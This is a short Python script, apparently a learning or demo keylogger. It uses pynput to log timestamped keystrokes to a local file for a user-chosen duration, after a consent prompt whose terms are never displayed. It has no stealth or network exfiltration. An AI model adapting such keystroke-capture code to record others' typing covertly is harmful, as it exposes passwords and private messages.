import pynput 
import time
import os
import sys

# Defines the log file path
log_file_path = "keyloggery_log.txt"

# Defines the keylogger function
def keylogger(key):
    # Format the timestamp and key press event
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    try:
        event = f"{timestamp} - {key.char}\n"
    except AttributeError:
        event = f"{timestamp} - {key}\n"

    # Writes the event to the log file
    with open(log_file_path, "a") as log_file:
        log_file.write(event)

accept_terms = input("\nDo you accept these terms and conditions? (y/n): ")

if accept_terms.lower() != 'y':
    print("You must accept the terms and conditions before using this program.")
    sys.exit()

# Prompts the user to enter the duration for which the keystrokes should be logged
try:
    log_duration = int(input("Enter the duration (in seconds) for which the keystrokes should be logged: "))
except ValueError:
    print("Invalid duration. Please enter a valid number.")
    sys.exit()

# Sets up the keylogger listener
listener = pynput.keyboard.Listener(on_press=keylogger)
listener.start()

# Runs the keylogger for the specified duration
start_time = time.time()
end_time = start_time + log_duration

while time.time() < end_time:
    
    time.sleep(1)

# Stops the keylogger listener
listener.stop()

# Displays the log file path

print("\nThe log file has been saved to:", os.path.abspath(log_file_path))
